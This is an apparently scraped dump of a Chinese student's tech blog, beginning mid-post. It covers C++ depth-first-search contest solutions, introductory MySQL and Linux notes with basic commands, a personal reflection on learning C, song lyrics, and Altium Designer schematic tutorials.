vector&lt;int&gt;v[maxn] 模拟接邻表，进行搜索。使用数组，对已搜索点标记。void dfs(int s, int e, int cnt);void putAns(); // 按格式输出 pathint main()&#123; int n, m, pre; scanf(&quot;%d&quot;, &amp;n); f(i, 1, n+1) &#123; scanf(&quot;%d%d&quot;, &amp;m, &amp;pre); int id; f(j, 1, m) &#123; scanf(&quot;%d&quot;, &amp;id); //存每一条道路 v[pre].push_back(id); v[id].push_back(pre); //每一道路所属联盟 Line[ToLine(pre, id)] = Line[ToLine(id, pre)] = i; pre = id; &#125; &#125; int t; scanf(&quot;%d&quot;, &amp;t); int s, e; while(t--) &#123; scanf(&quot;%d%d&quot;, &amp;s , &amp;e); //搜索前初始化所有 mem(vis, 0); tpath.clear(); minCnt=minTran=INF; //进行搜索 vis[s] = 1; tpath.push_back(s); dfs(s, e, 1); tpath.pop_back(); vis[s] = 0; //判断是否得到最优结果 if(minCnt == INF) printf(&quot;Sorry, no line is available.\\n&quot;); else putAns(); &#125; return 0;&#125;void dfs(int s, int e, int cnt)&#123; if( s==e &amp;&amp; ( cnt &lt; minCnt || (cnt == minCnt &amp;&amp; TranCnt() &lt; minTran) ) ) &#123; path = tpath; // 这个赋值我是真的不知道，vector复制还可以这么玩 minCnt = cnt; minTran = TranCnt(); &#125; if(s==e) return; //搜索到终点，但是代价不满足，舍弃 int len = v[s].size(); f(i, 0, len) &#123; int s2 = v[s][i]; if(!vis[s2]) &#123; vis[s2] = 1; tpath.push_back(s2); dfs(s2, e, cnt+1); tpath.pop_back(); vis[s2] = 0; &#125; &#125;&#125;//计算边的唯一标识，自定义 hash 映射规则。int ToLine(int x, int y)&#123; return x*10000+y; // x: 起点 y: 终点&#125;int TranCnt()&#123; int pre =0 , cnt = -1; int cur; int len = tpath.size(); f(i, 1, len) &#123; cur = Line[ ToLine(tpath[i-1], tpath[i]) ];//计算当前边的所属联盟编号 if(cur != pre)//如果当前边，与上一条边不同属一个联盟 &#123; pre = cur; cnt ++; &#125; &#125; return cnt; // 返回当前路径所换乘的次数。&#125;void putAns()&#123; printf(&quot;%d\\n&quot;, minCnt-1); // 不包括 起始，终止站，所以减2 int len = path.size(); int pre = path[0]; //记录下起点 int pre_id = Line[ ToLine(path[0], path[1]) ], cur_id; //记录下第一段路线所属联盟号 f(i, 2, len) &#123; cur_id = Line[ ToLine(path[i-1], path[i]) ]; if(cur_id != pre_id)&#123; printf(&quot;Go by the line of company #%d from %04d to %04d.\\n&quot;, pre_id, pre, path[i-1]); pre_id = cur_id; pre = path[i-1]; &#125; &#125; printf(&quot;Go by the line of company #%d from %04d to %04d.\\n&quot;, pre_id, pre, path[len-1]);&#125; 题目3：七段码该题为第十一届蓝桥杯省赛C/C++B组第5道填空题。基本上，会做这道题，省一没啥问题的。 不过蓝桥杯省一没啥用，国二及以上才有点儿用吧。 题目描述小蓝要用七段码数码管来表示一种特殊的文字。 七段码上图给出了七段码数码管的一个图示，数码管中一共有7 段可以发光的二极管，分别标记为a, b, c, d, e, f, g。小蓝要选择一部分二极管（至少要有一个）发光来表达字符。在设计字符的表达时，要求所有发光的二极管是连成一片的。 例如：b 发光，其他二极管不发光可以用来表达一种字符。例如：c 发光，其他二极管不发光可以用来表达一种字符。这种方案与上一行的方案可以用来表示不同的字符，尽管看上去比较相似。例如：a, b, c, d, e 发光，f, g 不发光可以用来表达一种字符。例如：b, f 发光，其他二极管不发光则不能用来表达一种字符，因为发光的二极管没有连成一片。请问，小蓝可以用七段码数码管表达多少种不同的字符？ 思路直接使用深度搜索。 把数码管每一段看成一个点，相邻表示相连。一共七个点。相邻的话，加一条双向边。可以用二维 vector 来存点，与边的信息。 然后暴力从每个点开始，搜索相应的深度，得到一条路径。 去重： 同一深度的搜索结果，路径可能经过的数码管段，是一样的，比如a-b，和b-a。可以将搜索结果（是一个集合）加到 set 集合内，进行去重。 也就是用集合的集合。set&lt; set &gt; ss。 ss 中每一个集合都是不重复的，所以不存在 a-b ， b-a 的情况。 总结 可以使用集合的集合存储搜索结果。 set的一些方法：set.insert(x) , set.erase(x) , set.clear() , set.size() 。 代码1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859#include &lt;bits/stdc++.h&gt;using namespace std;set&lt;int&gt; s;set&lt;set&lt;int&gt;&gt; ss;vector&lt;int&gt; v[10];bool vis[10];void putadge(int a, int b)&#123; v[a].push_back(b); v[b].push_back(a);&#125;void dfs(int st, int Cnt , int step)&#123; if(step == Cnt) &#123; ss.insert(s);//搜索路径虽然有重复，可以用集合的集合进行去重 return; &#125; if(step &gt; Cnt) return; for(auto X:v[st]) &#123; if(!vis[X]) &#123; vis[X] = true; s.insert(X); dfs(X, Cnt, step+1); s.erase(X); vis[X] = false; &#125; &#125;&#125;int main()&#123; putadge(1, 2); putadge(1, 6); putadge(2, 3); putadge(2, 7); putadge(3, 4); putadge(3, 7); putadge(4, 5); putadge(5, 6); putadge(5, 7); putadge(6, 7); //以 i 开始，搜索深度为 j for(int i = 1; i &lt;= 7; i++) &#123; for(int j = 1; j &lt;= 7; j++) &#123; s.clear(); memset(vis, 0, sizeof(vis)); vis[i] = true; s.insert(i); dfs(i, j, 1); &#125; &#125; cout &lt;&lt; ss.size() &lt;&lt; endl; return 0;&#125;","link":"","tags":[{"name":"ACM","slug":"ACM","permalink":"http://www.fangning.xyz.com/tags/ACM/"}]},{"title":"数据库","date":"2020-10-05T13:38:30.000Z","path":"2020/10/05/2020.10.05 数据库概述/","text":"概念 数据库优点 数据实现结构化 数据实现共享性 数据独立性强 数据粒度变小 数据库：DB（Database），保存大量有组织的数据。长期保存在计算机存储设备上，按照一定规则组织起来的，可以被各种用户和应用共享的数据集合。 数据库管理系统：DBMS（Database Management System）。 DB 是通过 DBMS 创建和操作的 容器。 MySQL（开源，免费）、==Oracle==（强大，广泛使用，昂贵）、SqlServer（微软，仅 windows）……….. 数据库查询语言：SQL ，DBMS 通用语言。 数据库发展阶段 层次数据库和网状数据库技术阶段 ==关系数据库==技术阶段 该阶段代表的数据库管理系统：Oracle、==DB2（IBM）==、SQL Server、MySQL、SyBase、InFormix …… 后关系数据库技术阶段 为解决关系数据库数据模型、性能、扩展伸缩性的缺点。 面向对象数据库技术（ORDBMS）：很好的支持对数据和对象的管理，与面向对象技术融合。 结构化数据库技术（NOSQL）：不需要固定的表结构，大型数据存取是具备关系数据库无法比拟的优势。 ==非关系型数据库==：==主流的有 redis，等。== SQL 所有的关系型数据库需要遵守 SQL 规范； 非关系型数据库，不需要遵守 SQL 规范。 SQL：结构化查询语言 Sql 是一个为了实现特殊目的的编程语言，去主要目的就是针对关系型数据库的各种操作，以及数据库中数据的增删改查等； Sql语言诞生于 1974 年，1980年美国的国家标准局数据库委员会将Sql定义成了关系型数据库语言的美国标准，ISO宣布将Sql定为关系型数据库的国际标准。 无论是 MySql、Oracle、SqlServer 主要都是 SQL 语言，彼此只有少部分差距。 SQL：分类 ==DQL==（==数据==查询语言，主要是查询数据） 关键字：SELECT（查） WHERE（筛选过滤） ==DML==（==数据==操作语言，主要是增、删、改） 关键字：INSERT、UPDATE、DELEfTE TCL（事物控制语言） DCL（数据控制语言，==权限==操作） 关键字：GRANT（赋予用户权限） REVOKE（回收权限） DDL（数据定义语言） 关键字：CREATE（==数据库==创建） DROP（==数据库==删除） ALTER（==数据库==修改） CCL（指针控制语言） 数据存储方式 数据存放到表中，表再存放到库中 每个表有自己的唯一标识 一个数据库可以有多个表 表的特性： 表的每一列（字段），表示一个属性。指定了：==数据类型，长度==等； 表的每一行，表示一个对象，成员； 整个表，类似 java 中的一个封装的类。 MySQL安装优点 MySQL ——&gt; 属于 sun 公司 ———&gt; sun 公司被 oracle 收购 === MySQL 现在属于 oracle 公司。 开源，免费，可移植，功能强大……….. ==在WEB引用方面是最好的 RDBMS（Relational Database Management System）关系数据库管理系统。== DBMS的分类 基于共享文件系统的 DBMS，如微软的 Access 基于 客户机-服务器 的 DBMS，如常用的 mysql、oracle、sqlserver… 需要安装客户端。 也需要安装服务端。 社区版（免费）、企业版（收费，有添加额外功能）。 安装方法步骤 windows / Linux 安装方法：参考菜鸟教程 验证方法：[参考这个链接(http://c.biancheng.net/view/2383.html) 本人的一些经验： 拿到一个MySQL服务端安装程序，安装完 mySQL 5.5 类似版本的数据库管理工具之后呢，仅仅只是安装好了，还没配置。此时会出现一个叫 MySQL Server Instance Configuration 的配置文件，也就是接下来需要做一些 设备、端口、账户、密码、字符集等配置。需要记住的是默认的3306端口，账户，以及自己设置的密码。 配置的时候需要注意：字符集采用 utf8；勾选将 bin 目录添加到 windows 系统变量 path 中（如果不勾选的话，只能再 bin 目录下进行 mysql 服务指令操作，勾选后打开 cmd 直接就可以使用 mysql 指令）； 你所作的大部分配置都在安装目录 /bin/my.ini 文件中。后期可以更改这个配置文件。 安装完成后注意两个路径： 安装路径：C:\\Program Files (x86)\\MySQL\\MySQL Server 5.1 数据存储路径（ProgramData是隐藏的文件夹）：C:\\ProgramData\\MySQL\\MySQL Server 5.1 安装失败的话，卸载软件，删除上面两个文件夹就行，然后重试 安装完成后注意几个程序： MySQL administrator ： 数据库管理员 MySQL Command Line Client ：数据库命令行客户端 MySQL Server Instance Configuration：数据库配置程序 这些软件都按照在数据库的按照目录下。 如何使用 MySQL 服务 方法一，MySQL 是一种服务，就像 windows 其他服务一样，得先启动。可以 win + R -&gt; services 打开，查找，然后 开启/关闭 方法二，命令行模式： net start mysql net stop mysql 服务打开了，还不能用，需要登陆确认身份之后才能用啊 登陆方法： 方法一，使用上面提到的 MySQL Command Line Client 登陆，输入密码就行了。此方法仅限 root 用户可以登陆哦 方法二，win+r -&gt; cmd -&gt; mysql -&gt; 然后输入 mysql -h [主机名] -P [端口号] -u root -p[密码]。 注意 ‘-p’ 与 [密码] 之间无空格 mysql 如果无效，表示没有配置 bin 目录到系统变量 -h：表示 host 主机，[主机名]：可以是远程操控的主机，或者默认本地主机 localhost -P：表示 Port 端口，[端口号]：默认使用 3306，P 得是大写 -u：表示 user 用户，[用户名]：一般为 root 管理员 -p：表示 password 密码，[密码]：为 root 密码，自己设置的 方法二简单版，mysql -u root -p[密码] 省略了默认的 主机、端口 两个参数，==直接只需要输入账户，密码就行了==。 相关命令行指令123456789101112131415161718192021222324252627############################## DBA1. CREATE USER &#x27;username&#x27; IDENTIFIED By &#x27;123456&#x27;;2. GRANT CREATE,INSERT,SELECT ON [DBName].* TO &#x27;username&#x27;;############################## 普通用户3. USE [username];4. CREATE TABLE User(id int, name varchar(20));5. insert into User(1, &#x27;张三&#x27;);6. UPDATE User SET NAME=&#x27;李四&#x27; WHERE id=1;7. DELETE FROM User;8. SELECT * FROM User;9. DROP TABLE User;############################## DBA1. REVOKE CREATE,INSERT,SELECT ON [DBName].* Frome &#x27;username&#x27;;2. DROP USER &#x27;username&#x27;;3. exit; 其他配合软件 使用默认的 MySql 图形界面不太好使。 一般来说使用三方图形操作界面软件，常用的软件有 navicat 和 sqlyog 。 学习方法资料 平时视频看得比较多，所以喜欢看视频学习，B站有基于 Linux 环境的数据库学习，和尚学堂的一套教程，都还不错。 数据库学习资料推荐，岗位 运维中的==数据库管理员 DBA==： 《数据库系统概念》 ——- 了解数据库 —— 电子书 pdf 《MySQL 必知必会》 —— MySQL 是其中一种数据库系统，基于 SQL 数据库查询语言。—– 纸质书 《高性能 MySQL》——– 数据库进阶学习 Linux 环境下能用，最好不过，熟悉 Linux。","link":"","tags":[{"name":"mysql","slug":"mysql","permalink":"http://www.fangning.xyz.com/tags/mysql/"}]},{"title":"Linux 概述","date":"2020-10-02T04:03:30.000Z","path":"2020/10/02/2020.10.02 Linux概述/","text":"Linux概述 Linux ———— 一种开源操作系统，Linux 支持多用户，多任务，多线程以及多 CPU 的操作系统，它主要能运行引用程序，网络协议以及工具软件等，Linux 也支持 32 位与 64 位硬件，Linux 主要继承了 unix 的核心思想，是一个校内稳定的多用户网络操作系统。 高安全性：Linux 中除非使用 root 权限登录，否则程序是无法更改系统的设置以及配置，因此下载的恶意软件的权限都会受到限制； 网络防火墙非常强大。 高可用性：Linux 系统非常稳定，不容易崩溃； 易维护性：Linux 系统非常容易维护，Linux 每个发行版都有自己的软件管理中心提供定时更新，安全高效； 开源：开发者可以自由查看源码以及修改源码，从而及时发现问题以及解决问题，很多国家都在开发自己的 Linux 版本； 免费：Linux 的免费可以极大降低我们的开发成本。 内核版本号组成，r.x.y r ： 目前发部的内核版本 x : 偶数 表示稳定版本，奇数表示开发中版本 z : 错误修补次数 比较流行的版本 分为商业版， 以及社群版 Red Hat Mandrake Slackware Debian CentOS ———— 本人主要学习该版本的 Linux Ubuntu WMware 中安装 Linux参考资料: bilbili 最详细教学 千言万语都在视频里，我就不多累赘了 先查看自己 VMware 可支持安装的 Linux 各版本号，然后再对应的去官网下载 Linux ios Linux 系统w免费，直接官网下载，无需激活 建议安装 CentOS。我用 VMware 15 装了 CentOS 8，由于 CentOS 是由 Red-Hat 发展来的，所以采用了 VMware 中的 red-hat 8 来装 CentOS 8 完全没问题 安装过程很简单，用过 VMware 的应该都不难。 计算机启动基本过程详情参考： 计算机启动过程 进程：进程（Process）是计算机中的程序关于某数据集合上的一次运行活动，是系统进行资源分配和调度的基本单位，是操作系统结构的基础。 进程 = 程序 + 数据 + 系统硬件运行资源 123456789101112131415161718192021222324251. 按下电源键: 1) 上电，CPU 复位后开始工作 2) 执行跳转指令，跳转到 存储有 BIOS 程序的 ROM 中。2. BIOS自检: 1) 现在存储 BIOS 的存储器使用 Flash EPROM 这种可用擦写工具修改的芯片。 2) BIOS ------- Baic Input/Output System 基本输入输出系统 3) 该系统程序的主要作用: * 硬件自检：检查 cpu、内存、显卡、I/O、键盘鼠标等是否上电正常。 * 查找引导设备：BIOS将控制权交给启动程序。&quot;启动顺序&quot;可进入bios进行修改。3. 系统引导: 1) boot 启动的意思，bootloader 启动程序 2) bios 运行结束后，运行 MBR（主引导记录）: 另外一个引导程序，NTLDR、BOOTMGR、GRUB(启动管理器)等等 3) 计算机控制权转交给硬盘的某个分区 * 如果操作系统位于激活的主分区（主分区有四个，只能激活一个）内，计算机读取激活分区的第一个扇区。 * 如果操作系统位于逻辑分区内，也就是扩展分区（四个主分区内，的再分区）。计算机读取 “启动管理器”程序代码，直接提示用户选择启动哪个操作系统。—————— Linux 主要使用 GRUB 启动管理器。 # 对于嵌入式 系统来说，并没有 BIOS ，而是直接从 flsh 照顾你运行 bootloader启动程序 . 4. 启动内核: 1) 控制权给了操作系统，操作系统内核被加载到内存运行。 2) Linux 中，先运行 /boot 目录下内核文件 3) 第一个运行的程序是 /sbin/init ，该程序工具配置文件产生 init 进程 ———— Linux 第一个进程 PID = 1 4) init 进程产生其他的后代进程，加载系统各个模块，直到加载到 /bin/login 登陆程序，跳出登陆界面。 Shell shell 俗称 壳，是用户与 Linux 的接口。区别于内核 Shell 有图形 GUI 形式的 ， 也有 命令行的。 命令行模式下又分: 交互模式，类似 cmd.exe 非交互模式，类似批处理文件，Windows下的 .bat ，Linux下的 .sh 常见的Shell Linux 下 Shell 可能不同。也就是各种不同的标准 Bourne Shell \\ Korn shell \\ C Shell \\ Bourne Again Shell 等等 图形界面以及字符界面的切换 图形界面也就是 X-Windows 模式，Linux 系统默认开机进入 X-Windows 屏幕 tty2 当然，同时，Linux 还开起了其他六个 字符界面 屏幕 tty1，tty3-tty7 使用 ctrl + alt + Fn 可以在 各个屏幕之间切换。 注意如果是 VMware 中使用该快捷键，会与 VMware 本身的 ctrl + alt 快捷键冲突，需要修改 VMware 的快捷键。 编辑 -&gt; 习惯设置(preference) -&gt; 热键 改为 alt + shift + ctrl 完全退出 X-Windows在图形界面中，打开一个终端（ terminal 一个黑乎乎的命令行），然后输入 init 3，强行关闭图形界面，然后转到字符界面。 修改完运行级后，X-Windows 不再运行。 如需重启 x-windows 需要切换运行级到5 ———— init 5 环境变量 环境变量，指操作系统中用来指定操作系统运行环境的一些变量 系统级环境变量 对登陆系统的所有用户有效 存储位置：/etc/profilt 查看命令 env 用户级环境变量 对指定登陆的用户有效 存储位置: ~/.bash_profile 文件，其中 ~ 指用户目录，类似 windows 的 %userprofilt% .bash_profile 为一个隐藏文件 查看命令 env 了解 Linux 系统信息123456789101112131415161718192021221. [root@CentOS-1 /root]# 1) root : 表示当前登陆的身份。 2) CentOS-1 : 表示你给你的 Linux 取的主机名。 3) /root : 此处为当前路径，有时为 &#x27;~&#x27; 表示用户家目录。 4) &#x27;#&#x27; : 表示此时登陆的身份为超级管理员，&#x27;$&#x27; 表示普通用户。2. 查看硬盘信息: 1) fdisk -l 2) 会出现一堆信息，主需要在乎 &#x27;disk /dev/sda: 21.5G&#x27; # divice设备文件存放目录 3) &#x27;sda&#x27; 表示硬件在 Linux 系统中的&#x27;名称&#x27;，&#x27;sd&#x27; 表示硬盘所用为 &#x27;sata 接口&#x27;，&#x27;a&#x27; 表示&#x27;第一块&#x27;硬盘。3. 查看内存信息: 1) cat /proc/meminfo # concatenate连锁，cat file1 file2 &gt;&gt; file3 将文件1和文件2联合起来放到file34. 查看 cpu 信息: 1) cat /proc/cpuinfo # cat 可用来输出文件信息 2) 查看型号，主频，型号，产商 就行了5. 关机/重启: 1) 关机: poweroff 2) 重启: reboot 了解 Linux 目录结构和文件属性12345678910111213141516171819201. &#x27;/&#x27; : 表示根目录2. 和 Windows 一样，都是采用树状结构。3. 文件组织架构信息: 1) /bin ------ &#x27;系统命令字&#x27; ， 普通用户 &amp; root 都可以使用的命令！ # binaries 二进制文件 2) /sbin ------ &#x27;root&#x27; 专用&#x27;命令字&#x27;，比如开关机/重启，poweroff / reboot # superuser binaries 3) /boot ------ &#x27;引导&#x27;的意思，操作系统主引导目录。特点：独立的分区，有系统启动菜单，以及内核。 4) /dev ------ &#x27;device设备&#x27;，设备文件存放目录 # device 5) /etc ------ &#x27;配置文件&#x27;存放目录 # ETCetera 6) /home ------ &#x27;普通用户&#x27;家目录 7) /root ------ &#x27;超级管理员&#x27;的家目录 8) /lib , /lib64 ----- 一些&#x27;函数库&#x27;的存放路径 # libaray 9) /media ------ &#x27;光驱&#x27;的挂载目录，&#x27;挂载&#x27;：就是将一切和文件夹联系起来，一切皆文件 10) /mnt ------ &#x27;临时设备&#x27;的挂载目录，比如说 U盘文件，就在这里面。 &#x27;VMware与主机共享的文件夹也在此处&#x27; 11) /proc ------ process&#x27;进程&#x27;，该目录中所有的&#x27;数据都在内存中&#x27;。 12) /tmp ------ &#x27;临时文件&#x27;存放目录。 # tmporary 临时 13) /usr ------ &#x27;第三方软件&#x27;安装目录。 # unix shared resources 14) /var ------ 变量的意思，存放常变文件目录，比如&#x27;日志，邮件文件&#x27;。 # variable 变量 相关命令123456789101112131415161718192021222324252627282930313233343536373839401. uname -a 或 cat/proc/version 1) 查看当前系统版本号2. #echo $SHELL 1) 查看当前环境所用 Shell 标准，eg: #/bin/bash3. init [x]: # 初始化 1) 切换 Linux 运行级 2) 0: 停机 1: 单用户模式 2: 多用户，无 NFS 3: 完全多用户模式，标准运行级，&#x27;字符界面模式&#x27; 4: 一般不用 5: X-Window 系统，&#x27;图形界面模式&#x27; 6: 重启 # 系统默认开机 init 3 进入图形界面 # 可修改 /etc/inittab 文本文件中的 id:5:initdefault 为 id:3:initdefault # 这样子一开机就进入 3 运行级，也就是字符界面模式 4. ls -a # list all 1) 查看当前目录下的隐藏文件5. env: # enviroment 1) 查看当前系统的环境变量6. cd .. # change directory 1) 同 windows 表示返回上一级目录。7. pwd # print work directory 1) 显示当前路径。8. ls # list 1) 列出当前路径目录。9. clear 1) 清空当前屏幕，保留列出的信息，实际上只是将屏幕滚动了一页。10. reset 1) 完全清空当前屏幕。 相关经验 多实践，遇到问题学会自己查看错误讯息，或日志 /var/log Linux 网路功能很强。 熟练掌握 LInux 之后再玩架站。 注意 网络安全 这一点很重要。 架设安全的 Linux 主机 限制 Linux 主机的连线电脑 更改 wu-ftp 成为 proftp 系统 简单的防火墙设置 Linux 的套件升级。 在 LInux 系统中，一切皆文件，都有路径与文件名 Windows 下路径采用 反斜杠 \\ ，，， Linux 下采用斜杠 / 相关资料 鸟哥的 Linux 私房菜：新手建议 Linux C与C++ 一线开发实践 千峰网络安全课程 之 CentOS 基本使用 Linux 相关英文指令缩写含义","link":"","tags":[{"name":"Linux","slug":"Linux","permalink":"http://www.fangning.xyz.com/tags/Linux/"}]},{"title":"重拾C语言","date":"2020-10-01T09:33:40.000Z","path":"2020/10/01/2020.10.01 重拾C语言/","text":"重拾C语言前言：​ 可以看到，今天的日期是 10/1 号，国庆节，没做。而且也是中秋节呢！然而，苦逼我今天并没有放下心情来好好享受这美好的假期。因为心里一直在苦恼，纠结着，接下来的大三生活该如何走。 ​ 没错，这一刻我以及大三了，开学一个月了，我一直焦虑着。考研？就业？找什么工作？学什么技术？时间如何安排？不喜欢自己的专业课怎么办？许许多多的问题，一直困扰着我。我一直百度啊，google啊，去知乎，去看一些公众号，B站，论坛…….一直寻找，一个适合自己的答案，，然而直到这一刻，我还是没找到答案。 ​ 也许，答案并不存在；也许，答案就是， 无论结果如何，无论要学的东西有多难，多复杂，从现在开时，一切都不晚；抓紧每一分，每一秒，埋头苦干，就是答案。不喜欢专业课，那就混个及格就行，做自己想做的事情！ ———— 工作，挣钱，学校也没多大意思！ ​ 无论结果如何，我至少努力过，不是吗？哪怕，最后去搬砖，我也认了。 C / C++​ 自己对 C 语言还是很熟悉的，至少曾经用这个语言打过一年的比赛。虽然，acm程序设计赛，用到的只是 C 语言的冰山一角。但是，由于这是我的初(处)，所以对 C 语言还是带有很大的执念的。 ​ 所以，我将重新温习一遍学过的知识，然后深入学习该语言的其他部分，查漏补缺，夯实基础！ 我的选择​ IT 行业岗位那么多，在加上自己的专业还是个物联网工程，选择一条自己喜欢的路，感兴趣的方向真的不容易。 ​ 看到班里的同学一个个都学着单片机、STM32啊啥的，加实验室，做着各种项目，各种东西；也有同学搞 java 弄得很牛，轻轻松松搞个客户端，web项目啥的；更有打 acm 比赛，区域赛拿奖，各种比赛，奖学金拿到手软；有成绩好的学霸，绩点年年四点多…….. ​ 而我呢，说实话，很羡慕啊。 ​ 有想过好好搞硬件吧，反正专业就是这，但是心里却一直对软件感兴趣；有想过，搞网络安全，但是感觉自己每一点基础，以后靠这玩意吃饭，很难；想随大流搞java，又觉得java学的人太多，自己也不太喜欢这语言；最后，看到了 C++，觉得欸还不错啊，在 Linux 环境下敲代码，应该也挺有意思，所以就有了这。 ​ 要说真正的爱好，是生物学，不是计算机；但是，既然选择了这专业，那就得从了，谁让当初自己填志愿怂了呢？ ​ C/C++方向吧，不管以后如何，就这了。 学习方法 / 路线​ 听学长说过，基础很重要，不要急着出成功，搞些项目啊啥的，应该注重打好基础；也看过许多博主的学习路线，基本上也都强调基础。所以，工作的话，可能还是先放一放，可以先考个研。本科阶段，将计算机方面的基础知识学好，这就是目前的目标了。 ​ 万变不离其宗，基础知识永远不会过时，这些东西将会是以后学习一切的基石，得牢固。 ​ 建议在边学语言基础的时候，边学习Linux的使用，在Linux命令行环境下敲代码。然后，这学期还有计算机网络的课，和数据库的课。可以后期结合 c++ 加 数据库，一并把数据库结课作业搞定，一举两得。计算机网络，得好好学，还算感兴趣，暑假学过一部分。 计算机知识体系 c++学习路线 c++学习路线 java学习路线 IT所有行业该学啥","link":"","tags":[{"name":"C/C++","slug":"C-C","permalink":"http://www.fangning.xyz.com/tags/C-C/"}]},{"title":"美好事物","date":"2020-09-22T03:34:30.000Z","path":"2020/09/22/2020.09.22 停下来听首歌/","text":"美好事物​ ——— 房东的猫 热夏 你归来 听蝉 再游于 北方 知寒 沿途 不枉为 少年 终有个 结局圆满 你看 顽皮细雨招摇过远航 修理过小店某处忽明忽暗的灯盏 你听 江水流过人家吵着要上岸 你去过烟花三月的江南 你看 秋月温柔撕破了花瓣 却只为迎着暮冬大雪纷飞时贪玩 你说 要忘却所有不愉快的片段 把美好事物纯真的走完 把疲乏往期 装进朴质的长街 把失败恋爱 藏进路人的详谈 把起舞的今日 写成诗篇 多年后 也不遗憾 把无味春风 融进街边的早餐 把仰头月色 化为潇洒的释然 把漫长的故事 变成短暂 才配得起勇敢 把忧愁聚散 又何惧放胆 让幽邃夜晚 静躺入空山","link":"","tags":[{"name":"随笔","slug":"随笔","permalink":"http://www.fangning.xyz.com/tags/%E9%9A%8F%E7%AC%94/"}]},{"title":"原理图库模型创建","date":"2020-09-21T08:19:30.000Z","path":"2020/09/21/2020.09.21原理图库模型创建2/","text":"原理图库模型创建2光耦及二极管模型的创建 利用 放置 -&gt; 多边形 可以绘制出一个二极管形状的三角形: 把填充的给改成绿色。 线条宽度改成最小。 同样的，绘制二极管前面的那条杠，也可以用同样的方法绘制出来。 圆形工具的使用: 放置圆形。 默认起始边为 0°， 终止边是 360° 通过修改这两个参数可以，建立一个半圆弧。 导入他人的原理图库 先介绍一下 Altium Designer 对文件的后缀命名方式: .SchLib : 表示原理图库文件，Schematic Libarary。 .SchDoc : 表示原理图文件。 .PcbLib : 表示Pcb库文件。 .PcbDoc : 表示Pcb文件。 导入他人原理图库文件: # 如果嫌自己画太麻烦，那就可以从别人的原理图中，寻找自己需要的 原理图模型 先下载别人的原理图 目标.SchDoc 文件 拖动到 AD 软件内部，自动打开 打开 目标.SchDoc 文件，点击 设计-&gt;生产原理图库 这是就会生成 目标原理图 文件中所用到的 原理图库 文件 如果有重复的同样元件，直接跳过就行。 然后选取其中我们需要的部分，多选 -&gt; 复制， 然后粘贴到我们自己的原理图库中，并且可以做需要的修改。 元件放置，原理图绘制 打开 .SchDoc 文件，然后打开 Components 元件库: 可以选择软件默认自带的元件库。 一般选择自己新建的 原理图元件模型库 .SchLib 。 打开元件库之后，就可以将里面的元件拖放到图纸区进行放置了。 修改图纸尺寸，在图纸的属性栏里面，Sheet Size 中可以选择 ‘A4 A3 A2’ 等大小的图纸。 绘制原理图: 先将所有需要用到的元件，把 ‘相同功能的一组’ 元件 ‘相邻的’ 放到一起。 放置 -&gt; 绘图工具 -&gt; 线 : 添加线条，将各个模块单独的 ‘框起来’。 ‘按空格键’ 可以’改变 走线方式’（直角，任意角） 移动每个元件，到所属模块分区的 ‘中间’。 导线的连接，网路标签的添加 注意：导线 与 绘图工具中的线 不是同一个东西，千万不要弄错了。ctrl + w 是绘制导线，建议直接修改成 w 快捷键进行连线。 在原理图库里面修改完元件后，右击该元件，点击更新原理图，就会相应的更改原理图中放置过的该元件。 一般先将线路连接好， 网络标签添加好， 最后再统一修改元器件的编号，以及 Value 值。 添加网络标签。放置 -&gt; 网络标签（P-&gt;N） Value 与 元件编号的统一添加 很多电阻 R1,R2… ， 电容编号 C1,C2…. 手动添加起来很麻烦，可以使用工具快速添加。 工具-&gt;标注-&gt;原理图标注（P-&gt;A-&gt;A） 处理顺序，选择Z字顺序（左到右，上到下）。 选择好需要进行修改的原理图页，以及 起始编号大小。 点击更新，即可自动进行元件编号的统一修改。 注意：如果是仿照别人的进行绘制的话，因为后期需要对照·BOM 表，也就是物料清单进行修改元器件的封装。所以，这里元件的编号，最好和别人原理图的编号一致。 Value值的话，必须对照图纸进行一个个修改了。 修改的同时，再一次检查连线、网络标签、编号是否无误！ 封装管理器。 常见封装有 0402，0604，0805啥的。 在工具-&gt;封装管理器（T-&gt;G）中可以批量查看、修改元器件的封装类型。 原理图的编译及检查 工程 -&gt; 工程管理器 中修改 错误提示等级（警告，错误，致命错误……） 常见的一些错误： 编号重复：Duplicate part Designators 器件位号重复，编号重复。 悬空：Floating Net Label 、Floating power objects 网络标签和电源对象悬空。 单端网络：Net with only one pin ，一个网络只有其中一端，另外一端没有连接到其它地方。 通过 ALT + 鼠标左键点击，可高亮显示选中的网络。 或者通过视图 -&gt; 高亮网络，可以给选中的网络进行涂颜色。 可在原理图页面看到有红色波浪线的地方，就是错误发生的地方 也可以调用 message 面板查看原理图编译错误提示信息。 对于悬空的引脚，连接一个通用 ERC 符号 ‘X’ 。放置-&gt;指示-&gt;通用符（P-&gt;V-&gt;N）。 相关经验 放置管脚，或者其他线条啥的，先不要鼠标左键防止，可以先’按 tab 键’对正需要放置的对象进行’属性设置’。 按住 ‘shift 键’ 拖动元器件，可以实现复制操作。 粘贴的时候可以 ‘按 x / y’ 实现镜像粘贴。 ‘-&gt;’ 的绘制，可以直接修改 ‘线条的 end line 属性’。 平常多选是 按住 ctrl + 鼠标左键，但是在 原理图库绘制的时候是 ‘按住 shift + 鼠标左键’ 进行多选。","link":"","tags":[{"name":"PCB","slug":"PCB","permalink":"http://www.fangning.xyz.com/tags/PCB/"}]},{"title":"Altium Designer","date":"2020-09-19T14:11:30.000Z","path":"2020/09/19/2020.09.19 Altium Designer/","text":"安装与注册https://pan.baidu.com/s/1bqSYZbXgsIJ_11mrKu74pg 密码：jykg 这个是从微信 “火耳软件” 找到资源，AD 2019 。 学习途径额，我目前所学的是 ”bilibili 凡亿教育“ 发表的免费学习视频。 他们这个教育机构做得感觉还是不错的，如果感觉白嫖的不足以满足自己，可以去花一点钱，多学点知识。 淘宝课程店：fanyedu.taobao.com 官网：fanyedu.com ——- 里面也有很多免费的课程 其他学习 PCB 设计交流的联盟论坛： PCB联盟网：pcbbar.com —— 可进行一些资料的下载，以及问题的提问。 &#112;&#x63;&#x62;&#113;&#x61;&#x40;&#x66;&#97;&#110;&#121;&#x2d;&#101;&#100;&#97;&#46;&#99;&#111;&#109; ———- PCB图纸公益评审提交邮箱 PCB 生产，外包，制版的话 嘉立创 凡亿PCB 工程建立工程文件* 原理图库 * 原理图 * PCB 库 * PCB * 生产文件 * ...... 新建工程 新建一个工程目录：以后所有所建立的 原理图库、原理图、PCB库、PCB 都保存到这个工程目录内。 新建原理图库 新建原理图 新建PCB库 新建PCB 